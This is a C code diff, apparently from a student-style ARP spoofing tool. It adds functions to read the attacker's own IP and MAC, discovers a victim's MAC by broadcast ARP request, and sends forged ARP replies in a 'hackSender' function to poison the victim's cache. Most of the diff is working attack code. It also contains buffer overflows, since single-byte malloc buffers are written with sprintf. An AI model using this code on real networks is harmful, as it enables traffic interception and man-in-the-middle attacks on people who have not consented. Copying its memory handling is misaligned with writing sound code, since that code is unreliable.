@@ -19,13 +19,22 @@
 
 #define IP_ADDR_LEN 4
 
-void printMacAddress(u_char * mac, char * text) {
-    printf("%s", text);
+char * printIPAddress(uint8_t * ip) {
+    char * ret = (char *)malloc(sizeof(char));
+    sprintf(ret, "%u.%u.%u.%u\n", ip[0], ip[1], ip[2], ip[3]);
+
+    return ret;
+}
+
+char * printMacAddress(u_char * mac) {
+    char * ret = (char *)malloc(sizeof(char));
+
     for(int i = 0; i < ETHER_ADDR_LEN ; i++) {
-        printf("%02x", mac[i]);
-        if(i != ETHER_ADDR_LEN - 1) printf(":");
+        sprintf(ret + 3 * i, "%02x", mac[i]);
+        if(i != ETHER_ADDR_LEN - 1) sprintf(ret + 3 * i + 2, ":");
     }
-    printf("\n\n");
+    sprintf(ret + 3 * ETHER_ADDR_LEN -1 , "\n\n");
+    return ret;
 }
 
 uint8_t * parseIP(char * ori_ip) { // parsing string(ip)
@@ -37,15 +46,6 @@ uint8_t * parseIP(char * ori_ip) { // parsing string(ip)
         token = strtok(NULL, ".");
     }
 
-    return ip;
-}
-
-uint8_t * getRouterIPAddress(void) {
-    uint8_t * ip = (uint8_t *)malloc(sizeof(uint8_t));
-    ip[0] = 0xC0;
-    ip[1] = 0xA8;
-    ip[2] = 0x00;
-    ip[3] = 0x01;
     return ip;
 }
 
@@ -64,8 +64,10 @@ u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uin
     req -> ea_hdr.ar_pln = 4;
     req -> ea_hdr.ar_op = htons(opcode);
 
-    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
-        des_mac[i] = 0;
+    if(opcode == 1) {
+        for(int i = 0; i < ETHER_ADDR_LEN; i++) {
+            des_mac[i] = 0;
+        }
     }
 
     memcpy(req -> arp_sha, src_mac, ETHER_ADDR_LEN);
@@ -86,7 +88,23 @@ u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uin
     return packet;
 }
 
-u_char * getSenderMacAddress(char * dev) {
+char * getAttackerIPAddress(char * dev) {
+    char * ip = (char *)malloc(sizeof(char));
+    int fd;
+    struct ifreq ifr;
+    
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    ifr.ifr_addr.sa_family = AF_INET;
+    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", dev);
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+
+    close(fd);
+
+    return ip;
+}
+
+u_char * getAttackerMacAddress(char * dev) {
     struct ifaddrs *if_addrs = NULL;
     struct ifaddrs *if_addr = NULL;
 
@@ -117,9 +135,9 @@ u_char * getSenderMacAddress(char * dev) {
     return NULL;
 }
 
-u_char * getTargetMacAddress(pcap_t* handle, u_char * sender_mac_address, uint8_t * src_ip, uint8_t * des_ip) {
+u_char * getSenderMacAddress(pcap_t* handle, u_char * src_mac, uint8_t * src_ip, uint8_t * des_ip) {
     uint8_t broadcast[ETHER_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    u_char * packet = makeArpPacket(sender_mac_address, broadcast, src_ip, des_ip);
+    u_char * packet = makeArpPacket(src_mac, broadcast, src_ip, des_ip);
     pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));
 
     int cnt = 0;
@@ -129,16 +147,16 @@ u_char * getTargetMacAddress(pcap_t* handle, u_char * sender_mac_address, uint8_
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
-        u_char * target_mac_address = DataLinkLayer(packet);
-        if(target_mac_address) return target_mac_address;
+        u_char * sender_mac_address = DataLinkLayer(packet);
+        if(sender_mac_address) return sender_mac_address;
     }
     return NULL;
 }
 
 
-void hackTarget(pcap_t * handle, u_char * router_mac_address, u_char * target_mac_address, uint8_t * src_ip, uint8_t * des_ip) {
-    u_char * packet = makeArpPacket(router_mac_address, target_mac_address, src_ip, des_ip, 2);
+void hackSender(pcap_t * handle, u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip) {
+    u_char * packet = makeArpPacket(src_mac, des_mac, src_ip, des_ip, 2);
     pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));
 
-    printf("Success");
+    printf("[+] Success\n\n");
 }
